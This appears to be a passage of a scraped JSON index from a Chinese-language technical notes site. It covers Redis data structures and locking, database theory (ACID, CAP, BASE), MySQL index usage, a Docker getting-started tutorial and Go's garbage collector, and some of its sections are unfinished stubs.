中的实现 #  跳跃表定义在 server.h 这个文件中，它是有序集合的底层实现之一。\n跳跃表本身的实现结构名称为 zskiplist：\ntypedef struct zskiplist { struct zskiplistNode *header, *tail; unsigned long length; int level; } zskiplist; 其中 zskiplistNode 主要由 字符值、分值、多层跳跃指针 三个部分构成：\ntypedef struct zskiplistNode { sds ele; double score; struct zskiplistNode *backward; struct zskiplistLevel { struct zskiplistNode *forward; unsigned long span; } level[]; } zskiplistNode; 完美的跳跃表可以实现 O(log n) 的查找时间复杂度。\n参数 p #  跳跃表的实现有一个关键参数 p，在 Redis 中它被定义为默认值 1/4：\n#define ZSKIPLIST_P 0.25 /* Skiplist P = 1/4 */它有以下的含义：\n 在实现跳跃表的程序中，它表征新插入的元素是否要新加一层的概率。这也就是说：  一个新插入的元素有一层跳跃指针概率为 p，两层的概率为 $p^2$，后是 $p^3$；   第 x+1 层指针数量的数学期望，与第 x 层指针数量的数学期望，的比；  查找时间复杂度 #  设函数 f(x) 为：长度为 n 的跳跃表在查找第 x 项时需要经过的总路径数量。\n那么容易得到方程：\n $\\displaystyle f(x) = f(px) + \\frac{1}{2p}$  其中，因为这个差值是一个介于 0 与 $\\displaystyle \\frac{1}{p}$ 之间均匀分布的变量，所以期望是 $\\displaystyle \\frac{1}{2p}$。\n因为 p\u0026lt;1，所以：\n $\\displaystyle \\lim_{i \\rightarrow +\\infin} f(p^{i}x) = f(0) = 0$  其中 $f(0) = 0$ ，表示如果要查找的元素位于第一个元素，则不需要进行任何的查找操作。\n因此对上面的方程进行迭代，在长度为 n 的跳跃表中，最高层数为 $log_{\\frac{1}{p}} n$，所以可以得到这个函数方程的解：\n $\\displaystyle f(x) = 0 + \\frac{1}{2p} * log_{\\frac{1}{p}}n = - \\frac{ln(n)}{2p * ln(p)}$  对分母求导可以得到，考虑时间复杂度时的最合适的 p 是 $\\displaystyle \\frac{1}{e}$。\n期望空间复杂度 #  根据 zskiplistNode 的结构，我们基本可以认为一个 node 的大小跟一个 level 的大小是相同的，我们设这个大小为单位 1，于是可以得到空间复杂度计算方程：\n $\\displaystyle Size = n + np + np^2 + \\dots + n p^{log_{\\frac{1}{p}} n}$  乘 p 做差可得：\n $\\displaystyle Size = \\frac{1}{1 - p} *(n - n * n^{-1} * p) = \\frac{n - p}{1- p}$  可见 p 于区间 0-1 内，与 Size 是成正比关系的，所以在考虑 $\\frac{1}{2}$ 与 $\\frac{1}{4}$ 这两个理论实践复杂度时间取值中，Redis 选择了 $\\frac{1}{4}$。\n整数集合（Integer Set） #  整数集合定义在 intset.c 与 inset.h 这两个文件中，它是用于保存整数值的集合抽象数据结构：即它保存内容为整数值，并且集合内不会出现重复元素。它是集合键的底层实现之一。\n结构 #  intset 的结构定义相当简单：\ntypedef struct intset { uint32_t encoding; uint32_t length; int8_t contents[]; } intset; 其中 encoding 可以认为是高级语言中的枚举值，它定义在 intset.c 文件中：\n#define INTSET_ENC_INT16 (sizeof(int16_t)) #define INTSET_ENC_INT32 (sizeof(int32_t)) #define INTSET_ENC_INT64 (sizeof(int64_t)) contents 实际存储的数据类型由这个 encoding 决定，它会在访问时进行强制类型转化。\n升级 #  通过不同的 encoding 存储有以下好处：\n 提升灵活性，因为 C 语言的特性，不能用一个结构同时存储多个类型的数据； 节约内存，不需要为了大量小数字开辟大量高位内存；  但是因为 inset 的内容会动态变化，在一些场景下会触发升级（encoding 从小的类型转变为大的类型）。\n升级：intsetUpgradeAndAdd，在插入一个比类型值还大的数字时会触发升级。函数签名：\n/* Upgrades the intset to a larger encoding and inserts the given integer. */ static intset *intsetUpgradeAndAdd(intset *is, int64_t value) PS：为什么 inset 不像 hashtable 设计一个渐进性的升级方案。\n压缩列表（Zip List） #  压缩列表是为了节约内存而诞生的一种数据结构，它的本质是一个通过特殊编码方式存储的双向链表。\n当一个列表值中只包含少量的列表项，并且每个列表项要么就是小的整数值，要么就是比较短的字符串。那么Redis 底层就是使用压缩列表来做列表键的底层实现。\n结构 #  压缩列表的详细数据结构在源代码的 ziplist.c 文件开头有长达 200 行的注释解释，大体概括就是下面的结构：\n\u0026lt;zlbytes\u0026gt; \u0026lt;zltail\u0026gt; \u0026lt;zllen\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;entry\u0026gt; ... \u0026lt;entry\u0026gt; \u0026lt;zlend\u0026gt; 其中：\n zlbytes 指明了包括它自己在内的整个 ziplist 字节大小； zltail 指明了最后一个 entry 的相对偏移； zllen 指明了数组长度大小，即之后跟的 entry 的数量； zlend 是一个表征压缩列表结尾的字节，固定的值 0xFF；  entry 的内部也有许多通过编码降低内存的设计，大体概述就是下面的结构：\n\u0026lt;prevlen\u0026gt; \u0026lt;encoding\u0026gt; \u0026lt;entry-data\u0026gt; 在不同的情况下，这一基本结构有不同的变体。\n比如对于小整数，encoding，自身就可以表示数值，此时的结构为：\n\u0026lt;prevlen\u0026gt; \u0026lt;encoding\u0026gt; prevlen 通常只用一个字节表示，如果长度大于等于 254，则第一个字节置位为 0xFE：\n0xFE \u0026lt;4 bytes unsigned little endian prevlen\u0026gt; \u0026lt;encoding\u0026gt; \u0026lt;entry\u0026gt; 操作 #  压缩列表是一个“时间换空间”的设计，所以只能用于小列表项。\n  下标访问、entry 前指、entry 后指、获取字节数、获取列表大小等查询操作都是 O(1)；\n  插入、删除等涉及到大小变化的更新操作时间复杂度都是平均 O(N)；\n  插入、删除可能会引发连锁更新，所以最坏的时间复杂度是 O(N^2)\n  什么是连锁更新？\n 当 ziplist 保存了大量长度为 253 长度的 entry 时，如果在第一个位置插入了一个长度大于 253 的元素，则会导致之后的每一个 entry 执行连锁更新，时间复杂度 O(N^2)  对象 #  Redis 暴露给用户的并不是上面列举的这些“基本数据结构”，而是五个对象：\n 字符串对象（无前缀）、列表对象 (l)、哈希对象 (h)、集合对象 (s)、有序集合对象 (z)；  Redis 通过不同的编码方式表征具体的底层实现。\n结构 #  redisObject 声明在文件 rio.h 中，实际定义在 server.c 中：\ntypedef struct redisObject { unsigned type:4; unsigned encoding:4; unsigned lru:LRU_BITS; /* LRU time (relative to global lru_clock) or * LFU data (least significant 8 bits frequency * and most significant 16 bits access time). */ int refcount; void *ptr; } robj; 其中 type 就是在前面列举的五个基本数据类型：\n/* The actual Redis Object */ #define OBJ_STRING 0 /* String object. */#define OBJ_LIST 1 /* List object. */#define OBJ_SET 2 /* Set object. */#define OBJ_ZSET 3 /* Sorted set object. */#define OBJ_HASH 4 /* Hash object. */编码 #  encoding 表征这这个类型的对象底层使用的数据结构，通常一个类型只会使用两个底层数据结构：\n/* Objects encoding. Some kind of objects like Strings and Hashes can be * internally represented in multiple ways. The \u0026#39;encoding\u0026#39; field of the object * is set to one of this fields for this object. */ #define OBJ_ENCODING_RAW 0 /* Raw representation */#define OBJ_ENCODING_INT 1 /* Encoded as integer */#define OBJ_ENCODING_HT 2 /* Encoded as hash table */#define OBJ_ENCODING_ZIPMAP 3 /* Encoded as zipmap */#define OBJ_ENCODING_LINKEDLIST 4 /* No longer used: old list encoding. */#define OBJ_ENCODING_ZIPLIST 5 /* Encoded as ziplist */#define OBJ_ENCODING_INTSET 6 /* Encoded as intset */#define OBJ_ENCODING_SKIPLIST 7 /* Encoded as skiplist */#define OBJ_ENCODING_EMBSTR 8 /* Embedded sds string encoding */#define OBJ_ENCODING_QUICKLIST 9 /* Encoded as linked list of ziplists */#define OBJ_ENCODING_STREAM 10 /* Encoded as a radix tree of listpacks */具体到五个对象：\n 字符串对象：int、raw、embstr； 列表对象：ziplist、linkedlist；3.2 后 quicklist 成为其唯一编码模式； 哈希对象：ziplist、hashtable； 集合对象：intset、hashtable； 有序集合对象：ziplist、skiplist；  内存管理 #  针对于对象，Redis 使用“引用计数”的内存回收机制，并为 0-10000 这些数字设置了默认的对象共享。\n"},{"id":259,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/database/redis/2.%E5%8D%95%E6%9C%BA%E6%95%B0%E6%8D%AE%E5%BA%93/","title":"2.单机数据库","section":"Redis","content":"mixin #  概念 #  Mixin 这个概念本身是一种设计模式，它指一个类不通过继承的方式获得另一个类的所有方法与属性，它通常可以用于解决在不能实现多继承的语言（TypeScript 就是这样一个只支持单继承的语言）中实现多继承。\nTypeScript #  "},{"id":260,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/database/redis/%E9%94%81%E5%AE%9E%E7%8E%B0/","title":"锁实现","section":"Redis","content":" 参考：\n https://www.jianshu.com/p/81b0f1bd1328   Redis 实现锁机制 #  第一种锁命令 INCR #  这种加锁的思路是， key 不存在，那么 key 的值会先被初始化为 0 ，然后再执行 INCR 操作进行加一。\n然后其它用户在执行 INCR 操作进行加一时，如果返回的数大于 1 ，说明这个锁正在被使用当中。\n1、 客户端A请求服务器获取key的值为1表示获取了锁 2、 客户端B也去请求服务器获取key的值为2表示获取锁失败 3、 客户端A执行代码完成，删除锁 4、 客户端B在等待一段时间后在去请求的时候获取key的值为1表示获取锁成功 5、 客户端B执行代码完成，删除锁 $redis-\u0026gt;incr($key); $redis-\u0026gt;expire($key, $ttl); //设置生成时间为1秒 第二种锁 SETNX #  这种加锁的思路是，如果 key 不存在，将 key 设置为 value。\n如果 key 已存在，则 SETNX 不做任何动作\n1、 客户端A请求服务器设置key的值，如果设置成功就表示加锁成功 2、 客户端B也去请求服务器设置key的值，如果返回失败，那么就代表加锁失败 3、 客户端A执行代码完成，删除锁 4、 客户端B在等待一段时间后在去请求设置key的值，设置成功 5、 客户端B执行代码完成，删除锁 $redis-\u0026gt;setNX($key, $value); $redis-\u0026gt;expire($key, $ttl); 第三种锁 SET #  上面两种方法都有一个问题，会发现，都需要设置 key 过期。那么为什么要设置key过期呢？如果请求执行因为某些原因意外退出了，导致创建了锁但是没有删除锁，那么这个锁将一直存在，以至于以后缓存再也得不到更新。\n于是乎我们需要给锁加一个过期时间以防不测。但是借助 Expire 来设置就不是原子性操作了。所以还可以通过事务来确保原子性，但是还是有些问题，所以官方就引用了另外一个，使用 SET 命令本身已经从版本 2.6.12 开始包含了设置过期时间的功能。\n1、 客户端A请求服务器设置key的值，如果设置成功就表示加锁成功 2、 客户端B也去请求服务器设置key的值，如果返回失败，那么就代表加锁失败 3、 客户端A执行代码完成，删除锁 4、 客户端B在等待一段时间后在去请求设置key的值，设置成功 5、 客户端B执行代码完成，删除锁 $redis-\u0026gt;set($key, $value, array(\u0026#39;nx\u0026#39;, \u0026#39;ex\u0026#39; =\u0026gt; $ttl)); //ex表示秒 "},{"id":261,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/database/%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/","title":"基本概念","section":"Database","content":"数据库基本概念 #  什么是 NOSQL？\n NoSQL(NoSQL = Not Only SQL )，意即\u0026quot;不仅仅是SQL\u0026quot;。  ACID 理论 #  关系型数据库有事务（transaction）的概念，事务遵循 ACID 原则：\n A (Atomicity 原子性)：事务里的所有操作要么全部做完，要么都不做，事务成功的条件是事务里的所有操作都成功，只要有一个操作失败，整个事务就失败，需要回滚。 C (Consistency 一致性)： I (Isolation 独立性)： D (Durability 持久性)：  分布式系统 #  什么是分布式系统？\n 简单的来说，一个分布式系统是一组计算机系统一起工作，在终端用户看来，就像一台计算机在工作一样。这组一起工作的计算机，拥有共享的状态，他们同时运行，独立机器的故障不会影响整个系统的正常运行。  分布式系统的优点：\n  **可靠性（容错） ：**分布式计算系统中的一个重要的优点是可靠性。一台服务器的系统崩溃并不影响到其余的服务器。\n  **可扩展性：**在分布式计算系统可以根据需要增加更多的机器。\n  **资源共享：**共享数据是必不可少的应用，如银行，预订系统。\n  **灵活性：**由于该系统是非常灵活的，它很容易安装，实施和调试新的服务。\n  **更快的速度：**分布式计算系统可以有多台计算机的计算能力，使得它比其他系统有更快的处理速度。\n  **开放系统：**由于它是开放的系统，本地或者远程都可以访问到该服务。\n  **更高的性能：**相较于集中式计算机网络集群可以提供更高的性能（及更好的性价比）。\n  分布式系统的缺点：\n  **故障排除：**故障排除和诊断问题。\n  **软件：**更少的软件支持是分布式计算系统的主要缺点。\n  **网络：**网络基础设施的问题，包括：传输问题，高负载，信息丢失等。\n  **安全性：**开放系统的特性让分布式计算系统存在着数据的安全性和共享的风险等问题。\n  CAP 理论 #  在计算机科学中, CAP定理（CAP theorem）, 又被称作 布鲁尔定理（Brewer\u0026rsquo;s theorem）, 它指出对于一个分布式计算系统来说，不可能同时满足以下三点:\n 一致性(Consistency)：所有节点在同一时间具有相同的数据； 可用性(Availability)：保证每个请求不管成功或者失败都有响应； 分隔容忍(Partition tolerance)：系统中任意信息的丢失或失败不会影响系统的继续运作；  因为三者无法同时满足，所以分布式系统可以被分为 CA、CP、AP 三大类，因为 CA 系统本质只是单点集群，所以无法满足 P 的系统在分布式系统中是没有意义的，因此我们通常只讨论 AP 或 CP 系统。\nBASE 理论 #  BASE：Basically Available, Soft-state, Eventually Consistent。 由 Eric Brewer 定义。\n相对于 CAP 理论，BASE 理论则强调可用性超过一致性，通常用于描述 NoSQL 数据库的特性。\n Basically Available：基本可用 Soft-State：软状态/柔性事务。即在没有任何输入的情况下，状态也会发生变更。 Eventually Consistency：最终一致性。系统会随着时间的变化最终达到一致性的要求。  "},{"id":262,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/database/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","title":"性能优化","section":"Database","content":"性能优化 #  查询优化 #  查询语句使用原则：\n  范围查询的列放到索引列的最后面：MySQL 会一直向右利用索引匹配直到遇到范围查询（\u0026gt;、\u0026lt;、between、like）就停止匹配，所以如果将范围放在前面，后面的索引将无法使用。\nPS：这里的范围查询是不包括 in 的，in 是指多个等值条件查询，不对联合索引的匹配造成影响。但是通过 explain 分析执行计划时无法区别范围查询和多个等值查询（统一显示为 range）\n  = 和 in 可以乱序：MySQL 的查询优化器会帮你优化成索引可以识别的形式。根据经验是将业务中使用到的查询里最常用的列放在前面，这样可以尽量使用到该索引。\n  字符串通配符尽量后置：Like 查询如果使用 %s% 这种格式，非最左前缀匹配将无法使用到索引。\n  "},{"id":263,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/docker/1.orientation/","title":"1. Orientation","section":"Docker","content":"Part 1: Orientation and setup #  Docker 概念 #  What is docker? #  Docker is a platform for developers and sysadmins to develop, deploy, and run applications with containers. The use of Linux containers to deploy applications is called containerization.\nContainerization is increasingly popular because containers are:\n Flexible, Lightweight, Interchangeable, Portable, Scalable, Stackable  Images and Containers #    Image：包含所有运行一个程序所需环境的可执行包。比如：其中的代码，库文件，环境变量，配置文件等等。一个 container 通过运行一个 image 启动。\n  containers：运行一个 image 的实例，或者说一个拥有状态和用户进程的 image。你可以使用以下的命令查看正在运行的实例：\n$ docker ps   Containers and Virtual machines #    A container runs natively on Linux and shares the kernel of the host machine with other containers. It runs a discrete process, taking no more memory than any other executable, making it lightweight.\n  By contrast, a virtual machine (VM) runs a full-blown “guest” operating system with virtual access to host resources through a hypervisor. In general, VMs provide an environment with more resources than most applications need.\n  测试 Docker 的版本 #  通过以下的命令查看 docker 的版本：\n$ docker --version Docker version 17.12.1-ce, build 7390fc6 # view even more details about your docker installation with following command: $ docker info Containers: 0 Running: 0 Paused: 0 Stopped: 0 Images: 0 ... 测试 Docker 的安装 #  以下的命令会自动运行一个测试 image，若未安装，该命令会自动下载镜像：\n$ docker run hello-world Unable to find image \u0026#39;hello-world:latest\u0026#39; locally latest: Pulling from library/hello-world d1725b59e92d: Pull complete Digest: sha256:0add3ace90ecb4adbf7777e9aacf18357296e799f81cabc9fde470971e499788 Status: Downloaded newer image for hello-world:latest ... 通过之前的查看命令，可以看到 hello-world 这个 image 已经被安装到了机器上：\n$ docker image ls List the hello-world container (spawned by the image) which exits after displaying its message. If it were still running, you would not need the --all option:\n$ docker container ls --all 命令总结 #  ## List Docker CLI commands docker docker container --help ## Display Docker version and info docker --version docker version docker info ## Execute Docker image docker run hello-world ## List Docker images docker image ls ## List Docker containers (running, all, all in quiet mode) docker container ls docker container ls --all docker container ls -aq "},{"id":264,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/docker/2.containers/","title":"2. Containers","section":"Docker","content":"Part 2: Containers #  We start at the bottom of the hierarchy of such an app, which is a container, which we cover on this page.\n新的开发环境 Container #  In the past, if you were to start writing a Python app, your first order of business was to install a Python runtime onto your machine. But, that creates a situation where the environment on your machine needs to be perfect for your app to run as expected, and also needs to match your production environment.\nWith Docker, you can just grab a portable Python runtime as an image, no installation necessary. Then, your build can include the base Python image right alongside your app code, ensuring that your app, its dependencies, and the runtime, all travel together.\nThese portable images are defined by something called a Dockerfile.\n用 Dockerfile 定义 Container #  文件 Dockerfile 定义了文件进入 container 的规则。令 container 像向网络接口请求数据一样向 host 机器请求数据，它与 host 其他环境完全分离，所以你需要定义一个端口映射到 host 的外界并且定义可以进入环境的文件。这些内容都可以写在 Dockerfile 这个文件中。\nDockerfile #  一个基本的 Dockerfile 示例如下：\n# Use an official Python runtime as a parent imageFROMpython:2.7-slim# Set the working directory to /appWORKDIR/app# Copy the current directory contents into the container at /appCOPY . /app# Install any needed packages specified in requirements.txtRUN pip install --trusted-host pypi.python.org -r requirements.txt# Make port 80 available to the world outside this containerEXPOSE80# Define environment variableENV NAME World# Run app.py when the container launchesCMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;]该 Dockerfile 中指明了 app.py 和 requirement.txt 两个文件未创建。\n这两个文件只需要创建在与 Dockerfile 同级目录下，上面的 COPY 命令会将它们复制到镜像中，而其中的 EXPOSE 则使我们的 app.py 可以通过 HTTP 协议访问到。\n接下来我们创建它们。\napp.py #  from flask import Flask from redis import Redis, RedisError import os import socket # Connect to Redis redis = Redis(host=\u0026#34;redis\u0026#34;, db=0, socket_connect_timeout=2, socket_timeout=2) app = Flask(__name__) @app.route(\u0026#34;/\u0026#34;) def hello(): try: visits = redis.incr(\u0026#34;counter\u0026#34;) except RedisError: visits = \u0026#34;\u0026lt;i\u0026gt;cannot connect to Redis, counter disabled\u0026lt;/i\u0026gt;\u0026#34; html = \u0026#34;\u0026lt;h3\u0026gt;Hello {name}!\u0026lt;/h3\u0026gt;\u0026#34; \\ \u0026#34;\u0026lt;b\u0026gt;Hostname:\u0026lt;/b\u0026gt; {hostname}\u0026lt;br/\u0026gt;\u0026#34; \\ \u0026#34;\u0026lt;b\u0026gt;Visits:\u0026lt;/b\u0026gt; {visits}\u0026#34; return html.format(name=os.getenv(\u0026#34;NAME\u0026#34;, \u0026#34;world\u0026#34;), hostname=socket.gethostname(), visits=visits) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) requirement.txt #  Flask Redis 运行以下命令测试环境是否正确：\n$ pip install -r requirement.txt ... $ python app.py * Serving Flask app \u0026#34;app\u0026#34; (lazy loading) * Environment: production WARNING: Do not use the development server in a production environment. Use a production WSGI server instead. * Debug mode: off * Running on http://0.0.0.0:80/ (Press CTRL+C to quit) 浏览器中访问 localhost，便可以看到 soket.gethostname() 的结果。\n搭建 app #  在项目根目录下运行以下命令 build 这个项目（其中 -t 选项是为了给镜像起名字，注意最后的 . 指明是当前文件夹）：\n$ docker build -t test_image . 可以通过以下的命令查看注册在 Docker 后台的镜像：\n$ docker image ls Troubleshooting for Linux users #    代理服务器可能会禁止你的 web 应用连接。如果你使用了代理服务器，添加以下内容到 Dockerfile 中，其中 ENV 后指明代理服务器的主机名和端口号：\n# Set proxy server, replace host:port with values for your serversENV http_proxy host:portENV https_proxy host:port  DNS 配置错误会导致 pip 安装命令失败。你可能需要更改 Docker 守护进程的 DNS 设置。使用 dns key 编辑（或创建）文件 /etc/docker/daemon.json ：\n{ \u0026#34;dns\u0026#34;: [\u0026#34;your_dns_address\u0026#34;, \u0026#34;8.8.8.8\u0026#34;] } 保存之后重启 docker 服务即可：\n$ sudo service docker restart   启动 app #  通过以下命令启动服务（其中，4000:80 意为将机器的 4000 端口映射到容器内部的 80 端口）：\n$ docker run -p 4000:80 test_image 在浏览器中访问 localhost:4000 可以看到 docker 的运行结果。curl 命令也是同样的效果。\nCTRL+C 停止运行程序，在 windows 系统上或者 Linux 后台运行时可以使用以下命令先获取 CONTAINER ID 后停止运行程序：\n$ docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6ff52e6cfdbc test_image \u0026#34;python app.py\u0026#34; 10 seconds ago Up 8 seconds 0.0.0.0:4000-\u0026gt;80/tcp confident_hopper $ docker container stop 6ff52e6cfdbc 通过 detached mode，可以令 app 在后台运行，比如使用以下的命令：\n$ docker run -d -p 4000:80 test_image 镜像的可移植性 #  首先，当你想要将容器部署到生产环境时，你需要知道如何将容器推送到注册表 (registry)。\nA registry is a collection of repositories, and a repository is a collection of images—sort of like a GitHub repository, except the code is already built. An account on a registry can create many repositories. The docker CLI uses Docker’s public registry by default.\nLog in with your Docker ID #  在 Docker 官网 https://hub.docker.com 上注册账户，并用以下的命令在本地机器上登陆账户：\n$ docker login Tag the image #  将本地的一个镜像与注册表上的仓库关联起来的方式是 username/repository:tag。tag 是可选的，但是推荐使用，因为它是注册表给每个镜像一个版本名称的机制。\nNow, put it all together to tag the image. Run docker tag image with your username, repository, and tag names so that the image uploads to your desired destination. The syntax of the command is:\n$ docker tag \u0026lt;image\u0026gt; \u0026lt;username\u0026gt;/\u0026lt;repository\u0026gt;:\u0026lt;tag\u0026gt; Run docker image ls to see your newly tagged image.\nPublish the image #  以下的命令可以用于上传仓库：\n$ docker push \u0026lt;username\u0026gt;/\u0026lt;repository\u0026gt;:\u0026lt;tag\u0026gt; Once complete, the results of this upload are publicly available. If you log in to Docker Hub, you see the new image there, with its pull command.\nPull and run the image from the remote repository #  现在，你可以通过以下的命令在任何一个机器上运行你的 app：\n$ docker run -p 4000:80 \u0026lt;username\u0026gt;/\u0026lt;repository\u0026gt;:\u0026lt;tag\u0026gt; 如果 image 在本机并不可用，Docker 会自动从远端拉取镜像。\n命令总结 #  docker build -t friendlyhello . # Create image using this directory\u0026#39;s Dockerfile docker run -p 4000:80 friendlyhello # Run \u0026#34;friendlyhello\u0026#34; mapping port 4000 to 80 docker run -d -p 4000:80 friendlyhello # Same thing, but in detached mode docker container ls # List all running containers docker container ls -a # List all containers, even those not running docker container stop \u0026lt;hash\u0026gt; # Gracefully stop the specified container docker container kill \u0026lt;hash\u0026gt; # Force shutdown of the specified container docker container rm \u0026lt;hash\u0026gt; # Remove specified container from this machine docker container rm $(docker container ls -a -q) # Remove all containers docker image ls -a # List all images on this machine docker image rm \u0026lt;image id\u0026gt; # Remove specified image from this machine docker image rm $(docker image ls -a -q) # Remove all images from this machine docker login # Log in this CLI session using your Docker credentials docker tag \u0026lt;image\u0026gt; username/repository:tag # Tag \u0026lt;image\u0026gt; for upload to registry docker push username/repository:tag # Upload tagged image to registry docker run username/repository:tag # Run image from a registry "},{"id":265,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/docker/3.services/","title":"3. Services","section":"Docker","content":"Part 3: Services #  关于 Services #  In a distributed application, different pieces of the app are called “services”. For example, if you imagine a video sharing site, it probably includes a service for storing application data in a database, a service for video transcoding in the background after a user uploads something, a service for the front-end, and so on.\nServices are really just “containers in production.” A service only runs one image, but it codifies the way that image runs—what ports it should use, how many replicas of the container should run so the service has the capacity it needs, and so on. Scaling a service changes the number of container instances running that piece of software, assigning more computing resources to the service in the process.\nLuckily it’s very easy to define, run, and scale services with the Docker platform \u0026ndash; just write a docker-compose.yml file.\n第一个 docker-compose.yml 文件 #  "},{"id":266,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/golang/draveness/%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97/","title":"常用关键字","section":"Draveness","content":"常用关键字 #  defer #  实例 #  下面是一个使用 defer 的实例：\nfunc createPost(db *gorm.DB) error { tx := db.Begin() defer tx.Rollback() if err := tx.Create(\u0026amp;Post{Author: \u0026#34;Draveness\u0026#34;}).Error; err != nil { return err } return tx.Commit().Error } 可见它的用法是：defer 之后指定的语句，会在整个函数执行结束的时候执行。\n"},{"id":267,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/golang/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/","title":"垃圾回收","section":"Golang","content":"Golang GC #  常见 GC 算法 #     名称 描述 优点 缺点     引用计数 根据对象自身的引用计数来回收，当引用计数归零时进行回收。 简单直接，回收速度快 需要额外的空间存放计数；\n需要频繁更新计数；\n无法处理循环引用的情况；   标记清除 标记出所有不需要回收的对象，在标记完成后统一回收掉所有未被标记的对象。 简单直接，速度快 会造成不连续的内存空间（内存碎片）\n不适合回收对象过多的场景   复制法 将内存分为大小相同的两块，每次使用其中的一块，当这一块的内存使用完后，将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉 解决了内存碎片的问题 每次清除针对的都是整块内存，效率低于标记清除法；\n有部分内存总是利用不到，资源浪费，移动存活对象比较耗时，并且如果存活对象较多的时候，需要担保机制确保复制区有足够的空间可完成复制；   标记整理 标记过程同标记清除法，结束后将存活对象压缩至一端，然后清除边界外的内容。 解决了内存碎片的问题，也不像标记复制法那样需要担保机制，存活对象较多的场景也使适用； 性能低，因为在移动对象的时候不仅需要移动对象还要维护对象的引用地址，可能需要对内存经过几次扫描才能完成；   分代式 将对象根据存活时间的长短进行分类，存活时间小于某个值的为“年轻代”，存活时间大于某个值的为“老年代”，永远不会参与回收的对象为“永久代”。并根据分代假设（如果一个对象存活时间不长则倾向于被回收，如果一个对象已经存活很长时间则倾向于存活更长时间）对对象进行回收。  STW 对用户代码影响大    Golang GC #  Golang 使用的垃圾清理算法是“无分代”、“不整理”、“与用户代码并发执行”的三色标记清理算法。\n为什么 Golang 不使用“顺序内存分配器”？\n Go 运行时的分配算法基于 tcmalloc，基本上没有碎片问题，对对象进行整理不会带来实质性的性能提升。 并且顺序内存分配器在多线程的场景下并不适用。  为什么 Golang 不使用“分代假设”？\n 分代假设的优点在于处理短时间存活的新创建对象，但是 Golang 会通过“逃逸分析”将大部分新生对象存储在栈上，所以分代假设在 Golang 上没有带来直接的优势； Go 的垃圾回收器与用户代码并发执行，这使得 STW 的时间与对象的代际、对象的 size 没有关系。  三色标记原理 #  三色标记法将对象分为三类，并用不同的颜色相称：\n 白色对象（可能死亡）：未被回收器访问到的对象。在回收开始阶段，所有对象均为白色，当回收结束后，白色对象均不可达。 灰色对象（波面）：已被回收器访问到的对象，但回收器需要对其中的一个或多个指针进行扫描，因为他们可能还指向白色对象。 黑色对象（确定存活）：已被回收器访问到的对象，其中所有字段都已被扫描，黑色对象中任何一个指针都不可能直接指向白色对象。  具体的算法实现是维护一个“灰色对象队列”，从“根对象”开始进行“广度优先遍历”。其中根对象是一个集合，包括：\n  全局变量：在程序编译的时候就已经确定存在于整个生命周期的变量；\n  执行栈：每个 goroutine 都包含自己的执行栈，这些执行栈上包含栈上的变量及指向分配的堆内存区块的指针；\n  寄存器：寄存器的值可能表示一个指针，参与计算的这些指针可能指向某些赋值器分配的堆内存区块。\n  屏障机制 #  引入原因 #  Golang GC 是没有 STW (Stop The World) 的，它的垃圾回收器是与用户代码并发执行的。\n但是这一机制会导致在下面的这个并发情况下，错误地回收了对象 B：\n 在垃圾回收进行到这样阶段时：灰色对象 A 引用了白色对象 B，黑色对象 C 没有引用白色对象 B； 用户代码移除了引用 $$A \\rightarrow B$$，增加了引用 $$C \\rightarrow B$$； 因为 C 已经被标记为黑色对象了，B 就将会一直被保持为白色对象直到扫描结束，从而被错误回收；  因为 GC 与用户代码是并行的，所以会破坏三色标记法在 STW 下运行的基本假设：\n   假设 节点性质 V 入边性质 EN 出边性质 EP     黑色对象假设 B 黑色对象一定是存活对象 一定存在一个黑色对象 只能引用灰色、黑色对象   灰色对象假设 G 灰色对象一定是存活对象 一定存在一个黑色或灰色对象 🈚️无限制   白色对象假设 W 结束时，一定为死亡对象 只能被灰色、白色对象引用 🈚️无限制    其中最重要的性质是 W-V，破坏这个性质会直接导致 GC 算法不可用。\n用户代码的运行可能：\n 插入新的引用路径：破坏上面表格中的\u0026quot;B-EP\u0026quot;/\u0026ldquo;W-EN\u0026rdquo;/\u0026ldquo;W-V\u0026quot;三个性质； 删除已有的引用路径：破坏上面表格中的\u0026quot;B-V\u0026rdquo;/\u0026ldquo;B-EN\u0026rdquo;/\u0026ldquo;G-V\u0026rdquo;/\u0026ldquo;G-EN\u0026quot;四个性质；  所以 Golang 引入了屏障的概念，即：\n 在用户代码并行执行时，Hook 用户代码的一些操作，来实现存活对象不会被误清理的目的；  Dijkstra 屏障：插入路径 #  即在用户代码插入路径时执行一些操作：\n 如果新建一个路径 $$A \\rightarrow B$$，则将 B 对象标记为灰色对象； 如果将路径 $$A \\rightarrow C$$ 替换为 $$A \\rightarrow B$$，则将 B 对象标记为灰色对象；  这一算法有以下缺点：\n 在插入屏障下的结果是必要条件，能够确保不被误删除，但会遗留未清理垃圾。 每次写入操作都需要执行额外代码会造成性能开销。Golang 在实现时实际只对堆区对象加入了写屏障，栈区代码会发生更改后被标记，在扫描结束后通过 STW 重新处理。  Yuasa 屏障：删除路径 #  即在用户代码删除路径时执行一些操作：\n 如果删除路径 $$A \\rightarrow C$$，且 C 之前为白色，则 C 被标记为灰色； 如果将路径 $$A \\rightarrow C$$ 替换为 $$A \\rightarrow B$$，且 C 之前为白色，则 C 被标记为灰色；  